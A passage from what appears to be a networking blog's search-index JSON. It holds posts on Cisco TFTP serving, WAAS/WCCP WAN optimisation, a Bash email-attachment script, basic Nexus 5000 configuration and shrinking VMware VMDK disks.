tftp://192.168.10.1/ios/c180x-advipservicesk9-mz.124-9.T7.bin flash: Server A Cisco router can act as a TFTP server, allowing remote clients to get locally stored files:\ntftp-server flash:c180x-advipservicesk9-mz.124-9.T7.bin Each local file must be declared as a TFTP file.\n","cover":"/images/vendors/cisco.webp","permalink":"https://www.adainese.it/blog/2013/09/12/a-cisco-device-as-a-tftp-server/","title":"A Cisco device as a TFTP server"},{"categories":["infrastructure"],"contents":"The Cisco WAAS system consists of a set of devices that work together to optimize TCP network traffic. There are two types of devices that run WAAS software:\nCisco Wide Area Application Engine (WAE) Cisco Wide Area Virtualization Engine (WAVE) WAVE appliances implement virtualization: virtual blades can run one or more virtualized OSes within the WAVE appliance. For example, WAVE-574 can run Microsoft Windows services such as Print Services, Active Directory Services, DNS, and DHCP services. The Cisco WAE-674 Wide Area Application Engine is the only branch-office appliance from the Cisco WAE platform that offers virtual blade capability. Other WAE models cannot virtualize an external OS.\nWhy a WAN optimizator A WAN optimizator is not just a data compressor. It optimizes data transmission over a media with lower bandwidth and higher latency. A Cisco WAAS includes the following key elements:\nData Redundancy Elimination (DRE): it is a sort of data deduplication that uses disk and memory to store redundant data. Persistent LZ Compression (PLZ): packets are compressed before they are sent over the WAN link. Transport Flow Optimization (TFO): TFO is a series of TCP optimizations that enhance performance when a high latency media is used. Examples of TCP optimizations are: use large initial windows selective acknowledge window scaling large buffer advanced congestion avoidance algorithms But under real cases how WAAS behave?\nNow Cisco WAAS appliances are under the Data Center Business Unit, and the reason is simple: most of the TCP WAN traffic is Data Center related, and the Data Center traffic is the most optimizable.\nSuppose two data centers replicate each other over a WAN line. Both data centers run VMware, and Oracle over NetApp storage:\nReplication: NetApp Snapmirror is uncompressed; SQL: Oracle archive transport (over 1521 TCP port, used also for querying the database) is uncompressed; Other traffic (Web, CIFS, email, other file transfer types, \u0026hellip;) Above traffic is compressed with the following performances:\nReplication Traffic (NetApp Snapmirror) is reduced by 83%: the Replication traffic running over the WAN is 17% of the original traffic! SQL (Oracle archive transport) is reduced by 70%: the SQL traffic running over the WAN is 30% of the original traffic! Teradata replication traffic using FTP is reduced by 75%! During the tests, 2TB were entered into the WAE and only 580GB was run over the WAN line. This means a 73% reduction!\nWAAS Auto discovery In the following topology, only traffic between Site A and Site C must be optimized, traffic from and to Site B cannot be optimized because there is no WAE appliance there:\nLet\u0026rsquo;s suppose a communication initiated by Site A to Site C:\nSite A sends an SYN packet to Site C: the WAE in Site A sets the TCP option 0x21. WAE in Site B receives the SYN packet and sees that this communication can be optimized: the TCP option 0x21 is removed and the SYN packet reaches Site C. Site C sends an SYN/ACK packet back to Site A: the WAE in Site C shifts SYN SEQ by 2 billion. WAE in Site A receives the SYN/ACK packet and recognizes that this connection can be fully optimized. The correct SYN SEQ is restored and the packet reaches Site A. This particular TCP connection can now be optimized because there is an end-to-end WAE connection. WAAS through Firewall (Cisco ASA) If packets flow through a Firewall and unknown TCP options are removed (0x21 is an unknown TCP option), then WAAS Auto-Discovery mechanism will fail and traffic won\u0026rsquo;t be optimized. On the latest Cisco ASA a WAAS inspect rule must be activated:\npolicy-map global_policy class inspection_default inspect waas Checkpoint Firewalls should not be a problem, other firewalls should be checked.\nInline Cisco WAE/WAVE can be configured using an inline adapter or WCCP protocol. The inline adapter is the simplest method: just put the appliance between the WAN and the router, and all traffic flowing from and to the WAN will be optimized.\nMechanical bypass mode prevents the WAE Inline Adapter from becoming a single point of failure and allows traffic to continue to flow between the router and the client while it passes through an unresponsive WAE without being processed. Anyway, the traffic won\u0026rsquo;t be optimized if the WAE will fail. Serial inline cluster is designed for high-availability failover only:\nA serial inline cluster is not designed to provide load balancing or a method for scaling traffic beyond the capacity of a single Cisco WAAS device.\nMy opinion (and experience with other vendors) is that sometimes bypass mode does not work properly, so a better topology could be the following:\nIn the example above if the WAE will fail and the bypass mode won\u0026rsquo;t work, the active router will lose all routing from the WAN and can lower the HSRP priority to become the standby router. Of course, the traffic won\u0026rsquo;t be optimized anymore.\nWCCP To scale a WAAS installation, WCCP must be used. WCCP is a Cisco-developed content-routing protocol that provides a mechanism to redirect traffic flows in real-time. It has built-in load balancing, scaling, fault tolerance, and service-assurance (fail-safe) mechanisms.\nIn the above topology:\nthe client sends traffic to the WAN, the router (a.k.a. WCCP Server) redirects the traffic to the WAE (a.k.a. WCCP Client); the WAE optimizes traffic and sends it back to the router which forwards it to the WAN; the returning optimized traffic is received by the router and redirected to the WAE; the WAE restores the original traffic (uncompressed) and sends it back to the router which forwards the traffic to the client. A WCCP service group defines a set of characteristics about what types of traffic are intercepted, as well as how the intercepted traffic should be handled. Service groups can be well-known (0-50) or dynamic. Well-known services also referred to as static services, have a fixed set of characteristics that are known by both the WCCP server (IOS) and the client. The characteristics of a dynamic service are communicated to the WCCP server (IOS) when the client joins the service group.\nThe forwarding method defines how traffic that is being redirected from the router to the WAE is transmitted across the network (1,3). Two options are available:\nWCCP GRE: is the default forwarding method, encapsulates the intercepted packet in an IP GRE header with a source IP address of the WCCP server (IOS) and a destination IP address of the target WCCP client. WCCP L2: only available on hardware-based platforms such as the Catalyst series switches, simply rewrites the destination MAC address of the intercepted packet to equal the MAC address of the target WCCP client. L2 forwarding requires that the WCCP server (IOS) is Layer 2 adjacent to the WCCP client. The return method defines how the traffic returns from the WAE to the router. Three options are available:\nGeneric GRE or WCCP GRE: traffic returning from the WAE to the router is encapsulated using a GRE tunnel, with a destination IP address of the WCCP router-id and a source IP of the WAE itself. When the packet is received by the router, the GRE encapsulation is removed and the packet is forwarded. Generic GRE is for a hardware-based platform like Catalyst 6k, and WCCP GRE is for other platforms. IP Forwarding: packets from the WAE to the router are redirected using the IP forwarding table, typically using the default gateway address. Let\u0026rsquo;s choose two WCCP dynamic service numbers: one service will be used from the client to the WAN (61), and the other service will be used for return traffic from the WAN to the client (62).\nGiven the above topology, service 61 can be redirected to the WAE:\nusing the GigabitEthernet0/0 (ingress packets); using the GigabitEthernet0/1 (egress packets). Service 62 can be redirected to the WAE:\nusing the GigabitEthernet0/1 (ingress packets); using the GigabitEthernet0/0 (egress packets); The forwarding method should be WCCP GRE and the egress method can be both WCCP GRE or IP Forwarding (the second one will be used).\nThe router configuration is the following:\nip wccp 61 ip wccp 62 interface GigabitEthernet0/0 ip wccp 61 redirect in interface GigabitEthernet0/1 ip wccp 62 redirect in interface GigabitEthernet1/0 ip wccp redirect exclude in The interface connected to the WAE must be configured with the \u0026ldquo;exclude in\u0026rdquo; options; otherwise, packets will loop. Another equivalent configuration could be the following:\nip wccp 61 ip wccp 62 interface GigabitEthernet0/1 ip wccp 61 redirect out ip wccp 62 redirect in interface GigabitEthernet1/0 ip wccp redirect exclude in The redirect in option is less CPU consuming and it should be preferred over the redirect out option; so the first proposed configuration is better than the second one.\nIf the WAE is located in the same network as the clients, the egress method must be WCCP GRE or packets will loop:\nA GRE Tunnel must be configured between the router and the WAE, and traffic flowing through it must be excluded by WCCP redirect:\nip wccp 61 ip wccp 62 interface GigabitEthernet0/0 ip wccp 61 redirect in interface GigabitEthernet1/0 ip wccp 62 redirect in interface Tunnel1 ip unnumbered GigabitEthernet0/0 ip wccp redirect exclude in tunnel source GigabitEthernet0/0 tunnel destination \u0026lt;WAE IP\u0026gt; This is not a general rule, but WCCP is simpler if you mind that:\nan interface must be dedicated to the WAE: it can be physical or virtual (tunnel); the interface to the WAE must be excluded by WCCP redirect; use \u0026ldquo;redirect in\u0026rdquo; to redirect traffic from and to the WAE. With IOS routers, the redirect method must be \u0026ldquo;WCCP GRE\u0026rdquo; and the Egress method can be IP Forwarding or WCCP GRE. WCCP GRE must be used if WAE is now in a dedicated VLAN: in this case, a GRE Tunnel must be configured in the router.\nHA and scaling out using WCCP WCCP allows routers to balance the traffic load between more WAE appliances:\nWhen more WAE appliances (WCCP clients) are registered in the same service group, WCCP automatically distributes intercepted traffic across all of the WAE in the same service group. The mechanism that determines how intercepted traffic is distributed across the WCCP clients in the service group is called the assignment method. In WCCPv2, there are two available assignment methods: hash assignment and mask assignment. Mask should be preferred over Hash for better performance but it\u0026rsquo;s available on Cisco Catalyst switches only. Cisco IOS routers want Hash assignment.\nWith Generic/WCCP GRE egress methods are used. For the Catalyst 6500 platform to process GRE traffic in hardware, a single point-to-multipoint tunnel should be used.\nReferences Introduction to Cisco WAAS Cisco Wide Area Application Services Configuration Guide (Software Version Deploying Cisco Wide Area Application Services Deploying Cisco Wide Area Application Services (WAAS) (2013 London) WAE Inline Network Adapter WCCPv2 Overview and Implementation Best Practices Common WAAS/WCCP issues on interactions with Security Devices Verify Auto-Discovery on Cisco WAAS Configuring File Services Cisco Wide Area Virtualization Engine (WAVE): Models Comparison Configuring WAEs for a Graceful Shutdown of WCCP ","cover":"/blog/2013/08/27/cisco-wide-area-application-services-system-waas/wave/wae/topology.webp","permalink":"https://www.adainese.it/blog/2013/08/27/cisco-wide-area-application-services-system-waas/wave/wae/","title":"Cisco Wide Area Application Services system (WAAS/WAVE/WAE)"},{"categories":["automation","notes"],"contents":"I replaced most of my Bash script with Python but sometimes I still need Bash. The following script requires uuencode and sends an email with attachments using Bash:\n#!/bin/bash PATH=\u0026#34;/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\u0026#34; EMAIL_OK=\u0026#34;dainese@example.com\u0026#34; BODY_OK=\u0026#34;From: Webmaster\\nTo: undisclosed@example.com\\nSubject: Requested files\u0026#34; EMAIL_ERR=\u0026#34;dainese@example.com\u0026#34; BODY_ERR=\u0026#34;From: Webmaster\\nTo: undisclosed@example.com\\nSubject: Cannot send files\u0026#34; SOURCE=\u0026#34;/path/file/report*.xls\u0026#34; ZIP=\u0026#34;/tmp/report-date +%Y%m%d.zip\u0026#34; zip -q $ZIP $SOURCE if [ $?=0 ]; then ( echo -e \u0026#34;$BODY_OK\u0026#34;; uuencode $ZIP basename $ZIP ) | sendmail $EMAIL_OK else ( echo -e \u0026#34;$BODY_ERR\u0026#34; ) | sendmail $EMAIL_ERR fi rm -f $ZIP ","cover":"/images/vendors/bash.webp","permalink":"https://www.adainese.it/blog/2013/08/12/create-email-with-attachment-using-bash/","title":"Create email with attachment using BASH"},{"categories":["infrastructure"],"contents":"This article will show a list of activities to basically configure a Cisco Nexus 5000 switch. This is not an advanced configuration article, just an overview of basic configuration. People new to Cisco Nexus switches will be displaced by three features/commands:\nlicense (not covered in this article): Nexus Switch features are now licensed, as Fiber-Channel switches always were. feature: specific features must be enabled (loaded). Examples are: lacp, lldp, fex, vtp\u0026hellip; vrf: VRFs are used by default. A management VRF exists and must be used for management purposes Basic connectivity The first difference between a Catalyst switch and a Nexus switch is that Nexus use VRF by default. A management VRF exists and should be used for all management traffic:\nhostname nexus5596-01 interface mgmt0 ip address 10.1.12.6/24 vrf context management ip domain-name example.com ip name-server 10.1.7.8 10.1.7.9 ip route 0.0.0.0/0 10.1.12.1 Disabling Telnet Server SSH server is enabled by default. Telnet server can be disabled login through SSH and removing telnet feature:\nno feature telnet Any telnet user will be disconnected.\nNTP NTP is simple enough, just remember to use the right VRF:\nclock timezone CET 1 0 clock summer-time CEST 5 Sun Mar 02:00 5 Sun Oct 03:00 60 ntp server ntp1.example.com use-vrf management ntp server ntp2.example.com prefer use-vrf management Check the configuration with the following command:\nshow ntp peer-status Syslog Cisco Nexus switches can log through a Syslog server. Link and Trunk status change alerts are enabled:\nlogging event link-status enable logging event trunk-status enable logging server syslog.example.com 6 facility local5 use-vrf management RADIUS Authentication A couple of Radius servers are configured to allow centralized authentication through Windows Active Directory. First, define Radius servers, then define a Radius authentication group method:\nradius-server host radius1.example.com key radiuspsk authentication accounting timeout 5 radius-server host radius2.example.com key radiuspsk authentication accounting timeout 5 aaa group server radius RADIUS-AUTH server radius1.example.com server radius2.example.com deadtime 5 use-vrf management Again, management VRF is used. The Radius authentication can be tested:\ntest aaa group RADIUS-AUTH example\\user password Authentication method can be configured to use the group method (Radius) configured above:\naaa authentication login error-enable aaa authentication login console local aaa authentication login default group RADIUS-AUTH aaa accounting default group RADIUS-AUTH username example\\user role network-admin A Radius request is in the form:\nPacket-Type = Access-Request User-Name = \u0026#34;example\\\\user\u0026#34; NAS-Port-Type = Virtual NAS-Port = 3000 NAS-IP-Address = 10.1.12.6 Users allowed to log in to NAS-Port-Type Virtual will successfully authenticate to the Nexus Switch. By default, all authenticated users will have unprivileged access. To raise privileges each user must be configured inside the Nexus switch:\nusername example\\user role network-admin The same privilege can be set from Radius itself using a Cisco attribute:\nCisco-AVPair = \u0026#34;shell:priv-lvl=15\u0026#34; Cisco-AVPair = \u0026#34;shell:roles=network-admin\u0026#34; The first one is used by IOS devices, the last one is used by NX-OS devices.\nThe NX-OS supported fallback method for authentication is that if all the AAA remote RADIUS or TACACS+ servers are unreachable, then the login attempts to authenticate the SSH/Telnet user locally.\nAdding the second attribute can break the login process on some Catalyst switches. This happens because the second attribute is unknown to Catalyst switches but it is received as mandatory:\n000327: May 24 14:52:14.172: AAA/AUTHOR/EXEC: Processing AV service=shell 000328: May 24 14:52:14.172: AAA/AUTHOR/EXEC: Processing AV cmd* 000329: May 24 14:52:14.172: AAA/AUTHOR/EXEC: Processing AV priv-lvl=15 000330: May 24 14:52:14.172: AAA/AUTHOR/EXEC: Processing AV roles=network-admin 000331: May 24 14:52:14.172: AAA/AUTHOR/EXEC: received unknown mandatory AV: roles=network-admin 000332: May 24 14:52:14.176: AAA/AUTHOR/EXEC: Authorization FAILED To solve this just turn the second attribute from mandatory to optional with \u0026ldquo;*\u0026rdquo; rather than \u0026ldquo;=\u0026rdquo;:\nCisco-AVPair = \u0026#34;shell:priv-lvl=15\u0026#34; Cisco-AVPair = \u0026#34;shell:roles*network-admin\u0026#34; Call Home Call Home is a service to notify configurations/alerts by email. The first step is define an SNMP contact:\nsnmp-server contact noc@example.com Then call home can be configured. The first step is define who is the maintainer of the switch:\ncallhome switch-priority 3 site-id Padova email-contact noc@example.com phone-contact +391234567890 streetaddress st. example, 7 Then a profile can be configured. A profile defines who and how to receive email notifications:\ncallhome destination-profile Example destination-profile Example format full-txt destination-profile Example email-addr noc@example.com destination-profile Example alert-group all The last step is define how emails can be sent:\ncallhome transport email smtp-server smtp.example.com port 25 use-vrf management transport email from nexus5596-01@example.com enable Finally, test the call-home configuration:\ncallhome test inventory SNMP SNMP configuration is very easy:\nsnmp-server contact noc@example.com snmp-server location st. example, 7 - Padova snmp-server host snmp1.example.com traps version 2c public snmp-server host snmp1.example.com traps version 2c public snmp-server enable traps config snmp-server enable trap link snmp-server enable trap callhome snmp-server community public ro snmp-server source-interface traps mgmt 0 Jumbo Frame (MTU 9216) Jumbo frame is a feature requested when iSCSI/NFS/FCoE protocols are used. There are many opinions pros and cons about performance with or without Jumbo frames under iSCSI and NFS protocols. Jumbo frame is a requirement when FCoE is used because an FC frame is about 2k in length.\nEnabling Jumbo frames does not require a reboot:\npolicy-map type network-qos jumbo class type network-qos class-default mtu 9216 system qos service-policy type network-qos jumbo Check the current MTU supported on interfaces using the following command:\nshow queuing interface Ethernet1/47 [...] q-size: 470080, HW MTU: 9216 (9216 configured) Fabric Extender pre-provisioning In a Nexus 5K migration, one or more N2K can be pre-provisioned and pre-configured:\nfeature fex slot 100 provision model N2K-C2232P In the example the FEX will be connected to a port channel on Ethernet1/46-47 ports:\ninterface Ethernet1/46 channel-group 100 interface Ethernet1/47 channel-group 100 inrerface port-channel101 switchport mode fex-fabric fex associate 101 Now there will be 32 Ethernet interfaces under slot 100 (Ethernet100/1/1-32).\nvPC A vPC configuration needs to define a vPC keepalive link, a vPC peer link, and two vPC peer switches to form a vPC domain. A vPC domain includes vPC port-channel to the downstream devices.\nA vPC keepalive session is established using the management interface:\nA vPC domain includes both vPC switches, the vPC peer link,\nfeature vpc vpc domain 96 role priority 4096 peer-keepalive destination 10.1.12.7 A vPC peer link must be configured using a port-channel and two 10GbE interfaces at least:\ninterface Ethernet1/47 - 48 switchport mode trunk channel-group 1 interface port-channel1 switchport mode trunk spanning-tree port type network vpc peer-link A vPC (downstream) link must be configured using port channel on both switches, even if only one interface is bounded in each switch:\ninterface Ethernet1/1 switchport mode trunk channel-group 2 mode active interface port-channel2 switchport mode trunk vpc 2 The port-channel must configure a unique VPC ID, in the above example, the port-channel ID is used for VPC ID also.\nReferences Introduction to NX-OS – Basic system setup Virtual PortChannel Quick Configuration Guide Configuring RADIUS Configuring Smart Call Home Configuration of Jumbo MTU on Nexus 5000 and 7000 Series Spanning Tree Design Guidelines for Cisco NX-OS Software and Virtual PortChannels RADIUS Vendor-Specific Attributes and RADIUS Disconnect-Cause Attribute Values ","cover":"/images/vendors/cisco.webp","permalink":"https://www.adainese.it/blog/2013/05/24/cisco-nexus-5k-configuration-overview/","title":"Cisco Nexus 5k configuration overview"},{"categories":["notes"],"contents":"In this post we\u0026rsquo;ll see how to shrink a virtual (VMDK) disk before releasing the OVF/OVA image.\nDeveloping a VM which will be distributed online, require saving space. After deleting cache, log files, and so on, vmdk files won\u0026rsquo;t become smaller.\nHere is how vmdk disks can be shrunk:\n(obviously) free all space you can; zero (set to zero) free blocks; manually shrink your vmdk disk. Under Linux free block can be set to zero creating the biggest zeroed file disk that can fit:\ndd if=/dev/zero of=zeroedfile rm -f zeroedfile This procedure will securely delete all previously deleted files. In other words, all deleted files became irrecoverable.\nUnder Windows Secure Delete under Microsoft Windows from Microsoft can be used, and it securely deletes all previously deleted files:\nC:\u0026gt;sdelete -c C: Now vmdk disks became larger. They can be shrunk using vmware-vdiskmanager.exe from VMware vSphere 5.0 Virtual Disk Development Kit :\nC:\u0026gt;vmware-vdiskmanager.exe -k \u0026#34;c:UsersadaineseVirtual Machinesvmvm.vmdk\u0026#34; Now vmdk should be smaller.\n","cover":"/images/vendors/vmware.webp","permalink":"https://www.adainese.it/blog/2012/05/10/shrinking-vmware-vmdk-virtual-hard-disks/","title":"Shrinking VMware VMDK virtual hard disks"},{"categories":null,"contents":"","cover":"/images/default-cover.webp","permalink":"https://www.adainese.it/search/","title":"Search"}]